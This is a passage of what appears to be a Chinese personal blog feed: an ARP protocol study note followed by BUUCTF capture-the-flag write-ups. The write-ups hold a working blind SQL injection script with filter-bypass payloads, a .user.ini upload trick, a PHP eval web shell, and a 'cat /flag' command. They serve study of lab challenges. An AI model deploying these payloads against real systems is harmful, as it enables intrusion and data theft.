<li>机器可能更换 <code>NIC</code>（网络接口控制器（<code>network interface controller，NIC</code>），又称网络适配器（<code>network adapter</code>），网卡（<code>network interface card</code>），或局域网接收器（<code>LAN adapter</code>）），结果变成一个新的物理地址。</li>
<li>在某些局域网中，每当计算机加电时，他的物理地址都要改变一次。</li>
<li>移动电脑可以从一个物理网络转移到另一个物理网络，这样会时物理地址改变。</li>
</ul>
</li>
</ul>
<p>要避免这些问题出现，必须定期维护更新ARP表，此类比较麻烦而且会影响网络性能。</p>
<ul>
<li>动态映射<br>动态映射时，每次只要机器知道另一台机器的逻辑（IP）地址，就可以使用协议找出相对应的物理地址。已经设计出的实现了动态映射协议的有 <code>ARP</code> 和 <code>RARP</code> 两种。<code>ARP</code> 把 <strong>IP地址映射为物理地址</strong>。<code>RARP</code> 把 <strong>物理地址映射为逻辑（IP）地址</strong>。</li>
</ul>
<hr>
<h2 id="ARP原理及流程"><a href="#ARP原理及流程" class="headerlink" title="ARP原理及流程"></a>ARP原理及流程</h2><h3 id="ARP请求"><a href="#ARP请求" class="headerlink" title="ARP请求"></a>ARP请求</h3><p>在任何时候，一台主机有IP数据报文发送给另一台主机，它都要知道接收方的逻辑（IP）地址。但是IP地址必须封装成帧才能通过物理网络。这就意味着发送方必须有接收方的物理（MAC）地址，因此需要完成逻辑地址到物理地址的映射。而ARP协议可以接收来自IP协议的逻辑地址，将其映射为相应的物理地址，然后把物理地址递交给数据链路层。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnnqrj30vh0migsj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnnqrj30vh0migsj.jpg" class="lazyload"></a></p>
<h3 id="ARP响应"><a href="#ARP响应" class="headerlink" title="ARP响应"></a>ARP响应</h3><p>局域网中的每一台主机都会接受并处理这个ARP请求报文，然后进行验证，查看接收方的IP地址是不是自己的地址，只有验证成功的主机才会返回一个ARP响应报文，这个响应报文包含接收方的IP地址和物理地址。这个报文利用收到的ARP请求报文中的请求方物理地址以单播的方式直接发送给ARP请求报文的请求方。</p>
<h3 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主机A 的IP地址为 192.168.1.1，MAC地址为0A-11-22-33-44-01；</span><br><span class="line">主机B 的IP地址为 192.168.1.2，MAC地址为0A-11-22-33-44-02；</span><br></pre></td></tr></table></figure></div>

<p>当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程：</p>
<ul>
<li><p>第1步：根据 <code>主机A上的路由表内容</code> ，IP确定用于<strong>访问主机B的转发IP地址是192.168.1.2</strong>。然后A主机在自己的 <code>本地ARP缓存 </code>中检查主机B的匹配MAC地址。</p>
</li>
<li><p>第2步：如果主机A<code>在ARP缓存中没有找到映射</code>，它将询问192.168.1.2的硬件地址，从而 <code>将ARP请求帧广播到本地网络上的所有主机</code> 。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。</p>
</li>
<li><p>第3步：主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</p>
</li>
<li><p>第4步：主机B将包含其MAC地址的ARP回复消息直接发送回主机A。</p>
</li>
<li><p>第5步：当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p>
</li>
</ul>
<hr>
<h2 id="ARP协议报文字段抓包解析"><a href="#ARP协议报文字段抓包解析" class="headerlink" title="ARP协议报文字段抓包解析"></a>ARP协议报文字段抓包解析</h2><h3 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lp7r8j30qd0hbn00.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lp7r8j30qd0hbn00.jpg" class="lazyload"></a></p>
<p><strong>硬件类型</strong>：16位字段，用来定义运行ARP的网络类型。每个局域网基于其类型被指派一个整数。例如：以太网的类型为1。ARP可用在任何物理网络上。</p>
<p><strong>协议类型</strong>：16位字段，用来定义使用的协议。例如：对IPv4协议这个字段是0800。ARP可用于任何高层协议</p>
<p><strong>硬件长度</strong>：8位字段，用来定义物理地址的长度，以字节为单位。例如：对于以太网的值为6。</p>
<p><strong>协议长度</strong>：8位字段，用来定义逻辑地址的长度，以字节为单位。例如：对于IPv4协议的值为4。</p>
<p><strong>操作码</strong>：16位字段，用来定义报文的类型。已定义的分组类型有两种：ARP请求（1），ARP响应（2）。</p>
<p><strong>源硬件地址</strong>：这是一个可变长度字段，用来定义发送方的物理地址。例如：对于以太网这个字段的长度是6字节。</p>
<p><strong>源逻辑地址</strong>：这是一个可变长度字段，用来定义发送方的逻辑（IP）地址。例如：对于IP协议这个字段的长度是4字节。</p>
<p><strong>目的硬件地址</strong>：这是一个可变长度字段，用来定义目标的物理地址，例如，对以太网来说这个字段位6字节。对于ARP请求报文，这个字段为全0，因为发送方并不知道目标的硬件地址。</p>
<p><strong>目的逻辑地址</strong>：这是一个可变长度字段，用来定义目标的逻辑（IP）地址，<code>对于IPv4协议这个字段的长度为4个字节。</code></p>
<p>ARP报文不是直接在网络层上发送的，它还是需要向下传输到数据链路层，所以当ARP报文传输到数据链路层之后，需要再次进行封装。以以太网为例，ARP报文传输到以太网数据链路层后会形成ARP帧。ARP帧如下图所示，他就是在ARP报文前面加了一个以太网帧头。</p>
<hr>
<h3 id="ARP帧格式"><a href="#ARP帧格式" class="headerlink" title="ARP帧格式"></a>ARP帧格式</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnm4nj30s706j440.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnm4nj30s706j440.jpg" class="lazyload"></a></p>
<ul>
<li><p>目的MAC地址：占6字节，如果是ARP请求帧，因为它是一个广播帧，所以要填上广播MAC地址（FF-FF-FF-FF-FF-FF），其目标主机是网络上的所有主机。</p>
</li>
<li><p>源MAC地址：占6字节，这是发送ARP帧的节点MAC地址。</p>
</li>
<li><p>帧类型：占两字节，这里用来标识帧封装的上层协议，因为本帧的数据部分是ARP报文，所以直接用ARP的协议号0x0806表示就可以了。</p>
</li>
</ul>
<hr>
<h3 id="ARP报文总长度"><a href="#ARP报文总长度" class="headerlink" title="ARP报文总长度"></a>ARP报文总长度</h3><p>ARP报文的总长度为64字节。</p>
<p>首先要知道帧的概念 帧是在数据链路层传输的数据格式，比如以太网v2，以太网IEEE802.3和PPP等。</p>
<p>所以Wireshark抓到的帧是包含帧头的，即<code>包含以太网v2的帧头，长14 bytes</code>；</p>
<p>而ARP数据包的长度固定为 <code>28 bytes</code>；</p>
<p>帧总长度 &#x3D; 帧头 + 网络层包头 + 传输层报文头 + 应用数据；</p>
<p>而ARP请求中ARP包已经是最高层，之上没有传输层和应用层，所以总长度为：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">帧总长度 = 帧头 + ARP包头 = 14 + 28 = 42 bytes</span><br></pre></td></tr></table></figure></div>
<p>而真正发包的时为了保证以太网帧的最小帧长为 <code>64 bytes</code> ，会在报文里添加一个padding字段，用来填充数据包大小。</p>
<p>使用wireshark抓包时，抓到的包为60 bytes。比以太网帧的最小帧长扫了4 bytes，原因是因为wireshark抓包时不能抓到数据包最后的CRC字段。</p>
<p>CRC字段是为了校验以太网帧的正确性。在数据包填充完成后，回去通过算法计算一个值放到数据包的CRC字段中。当接受端收到数据包后，会同样使用算法计算一个值，然后和CRC字段的值进行对比，查看是否相同。如果不同则证明数据包被更改，如果相同则证明数据包并未被更改。</p>
<hr>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://blog.csdn.net/ever_peng/article/details/80008638">ARP协议详解</a><br><a href="https://blog.csdn.net/u011784495/article/details/71716586">ARP协议报文格式及ARP表</a><br>《计算机网络》(第七版) 谢希仁著<br>《计算机网络：自顶向下方法》（第七版）</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay11</title>
    <url>/yakko117/2023/03/16/BUUCTFDay11/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="QWB2021-Quals-托纳多"><a href="#QWB2021-Quals-托纳多" class="headerlink" title="[QWB2021 Quals]托纳多"></a>[QWB2021 Quals]托纳多</h1><p><a href="https://www.anquanke.com/post/id/244153#h2-4">出题佬的恶意</a><br>算了 被WAF了</p>
<p>写一下学习笔记好了</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay3</title>
    <url>/yakko117/2019/11/18/BUUCTFDay3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF-Day3"><a href="#BUUCTF-Day3" class="headerlink" title="BUUCTF Day3"></a>BUUCTF Day3</h1><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>sql注入，没什么好说的，告诉你表名和列名是flag<br>先测试 <code>1&#39;</code>，回显是bool型</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4ts17kj30kf05wglq.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4ts17kj30kf05wglq.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;      bool(false)</span></span><br><span class="line"><span class="string">1&#x27;</span>#     <span class="keyword">SQL</span> Injection Checked.</span><br><span class="line"><span class="number">1</span>#      <span class="keyword">SQL</span> Injection Checked.</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%23   bool(false)</span></span><br><span class="line"><span class="string">1%23    Hello, glzjin wants a girlfriend.</span></span><br></pre></td></tr></table></figure></div>

<p>被过滤了就会显示SQL Injection Checked，通过测试<br>过滤了<code>and&amp;&amp;、 or||、 空格 、# 、for、limit</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">3</span></span><br></pre></td></tr></table></figure></div>

<p>发现结果不一样，尝试 <code>&gt;4，&lt;4， =4</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuy14j30vg06haax.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuy14j30vg06haax.jpg" class="lazyload"></a></p>
<p>在自己环境下试一下<br>因为数据库是test， 所以大于和小于的情况为空<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuw58j30oa08mabx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuw58j30oa08mabx.jpg" class="lazyload"></a></p>
<h3 id="爆一下数据库"><a href="#爆一下数据库" class="headerlink" title="爆一下数据库"></a>爆一下数据库</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">32</span>)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.cnblogs.com/chrysanthemum/p/11740505.html">参考laolao师傅</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 用的是laolao师傅的脚本</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">def a():</span><br><span class="line">    url=&quot;http://d2967de5-5584-4bdd-96c5-9b6ed11d9b86.node3.buuoj.cn&quot;</span><br><span class="line">    flag=&quot;Hello, glzjin wants a girlfriend.&quot;</span><br><span class="line">    final=&quot;&quot;</span><br><span class="line">    stop=0</span><br><span class="line">    for i in range(1,129):</span><br><span class="line">         print(&quot;*&quot;*50,i,&quot;*&quot;*50)</span><br><span class="line">         stop=0</span><br><span class="line">         for j in range(32,129):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;&quot;id&quot;:&quot;(ascii(substr(database(),%d,1))=%d)&quot; %(i,j)&#125;</span><br><span class="line">             # data=&#123;&quot;id&quot;:&quot;(ascii(substr((select flag from flag),%d,1))=%d)&quot; %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">             html = etree.HTML(re).xpath(&quot;//text()&quot;)</span><br><span class="line">             print(&quot;&gt;&gt;&quot;,html)</span><br><span class="line">             if flag in html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(&quot;\n\t\t\t\t&quot;,final)</span><br><span class="line">                  break</span><br><span class="line"></span><br><span class="line">         if stop &gt;= 128:</span><br><span class="line">            print(&quot;*&quot;*50,&quot;结束&quot;)</span><br><span class="line">            print(&quot;&gt;&gt;&quot;,final)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure></div>

<p>爆出了数据库<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tskksj30cp03it8y.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tskksj30cp03it8y.jpg" class="lazyload"></a></p>
<hr>
<h3 id="过滤如何处理："><a href="#过滤如何处理：" class="headerlink" title="过滤如何处理："></a>过滤如何处理：</h3><p>在爆flag的时候发现有过滤 :select,show,””……很是难受，后来在师傅的博客上看到了这种方法：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4trln5j302u02d0sh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4trln5j302u02d0sh.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>^<span class="number">1</span>=<span class="number">0</span> ，<span class="number">0</span>^<span class="number">0</span>=<span class="number">0</span> ，<span class="number">0</span>^<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>^<span class="number">1</span>^<span class="number">1</span>=<span class="number">0</span>， <span class="number">1</span>^<span class="number">1</span>^<span class="number">0</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">构造payload:<span class="number">1</span>^<span class="built_in">ascii</span>(mid(database(),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">98</span>)^<span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>注意这里会多加一个 <code>^0</code> 或 <code>1</code>是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果<code>返回的结果是不同</code>的,那就可以证明语法是没有问题的</p>
<p>然而不用异或也是可以的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=(ascii(substr((select(flag)from(flag)),1,1))&lt;128)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4twg59j311j07qq45.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4twg59j311j07qq45.jpg" class="lazyload"></a></p>
<p>最后的脚本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">    url=<span class="string">&quot;http://d2967de5-5584-4bdd-96c5-9b6ed11d9b86.node3.buuoj.cn/&quot;</span></span><br><span class="line">    flag=<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">    final=<span class="string">&quot;&quot;</span></span><br><span class="line">    stop=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">50</span>,i,<span class="string">&quot;*&quot;</span>*<span class="number">50</span>)</span><br><span class="line">         stop=<span class="number">0</span></span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))&quot;</span> %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">             html = etree.HTML(re).xpath(<span class="string">&quot;//text()&quot;</span>)</span><br><span class="line">             <span class="comment"># print(&quot;&gt;&gt;&quot;,html)</span></span><br><span class="line">             <span class="keyword">if</span> flag <span class="keyword">in</span> html:</span><br><span class="line">                  final+=<span class="built_in">chr</span>(j)</span><br><span class="line">                  <span class="built_in">print</span>(<span class="string">&quot;\n\t\t\t\t&quot;</span>,final)</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> stop &gt;= <span class="number">128</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">50</span>,<span class="string">&quot;结束&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&quot;</span>,final)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure></div>

<p>得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tsrkmj30fs03ijrp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tsrkmj30fs03ijrp.jpg" class="lazyload"></a></p>
<hr>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn">源码</a><br><a href="http://www.mumaasp.com/222.html">重要知识点</a></p>
<p>点开题目，发现是个文件上传<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2gi2j30b505emx2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2gi2j30b505emx2.jpg" class="lazyload"></a></p>
<p>任意上传一张图后，得到文件的路径<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu7vx2j30ws07amxj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu7vx2j30ws07amxj.jpg" class="lazyload"></a></p>
<p>这边这张是自己一开始的截图 不是index.php 文件的显示<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgujjcxj30v10710tc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgujjcxj30v10710tc.jpg" class="lazyload"></a></p>
<hr>
<p>尝试利用上传.htaccess来解析上传的马。<br>然而这里尝试上传被waf了<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2v1pj309v05a748.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2v1pj309v05a748.jpg" class="lazyload"></a></p>
<p>然后就学到了新的知识</p>
<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>原理和 <code>.htaccess</code> 一样</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a  # 绕过文件头检测</span><br><span class="line">auto_prepend_file = aaaa.jpg</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9pwmj314f09swga.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9pwmj314f09swga.jpg" class="lazyload"></a></p>
<p>aaaa.jpg 绕过 <code>&lt;?</code> 的过滤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#\x00\x00\x8a\x39\x8a\x39</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_REQUEST[pass]);&lt;/script&gt;</span><br><span class="line">#php5环境下可用</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9oryj315g0btn0e.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9oryj315g0btn0e.jpg" class="lazyload"></a></p>
<p>上传后index.php会默认包含了一句话木马，命令执行，得到flag<br>payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php?pass=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu8ofwj30fr02f3yj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu8ofwj30fr02f3yj.jpg" class="lazyload"></a></p>
<p>当然因为服务器对文件头有exif_type的判断，直接通过xbm格式绕过，传.htaccess和.user.ini是可以的</p>
<h3 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$userdir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*这里创建的目录是777的权限，赛文赛文赛文！！！*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$userdir</span> . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;upload&quot;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$tmp_name</span>)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$name</span>)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/*得到后缀*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph|htacess/i&quot;</span>, <span class="variable">$extension</span>))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*正则过滤 .htacess ,各种php类型，有了一个 i 连大小写绕过都不行*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;? in 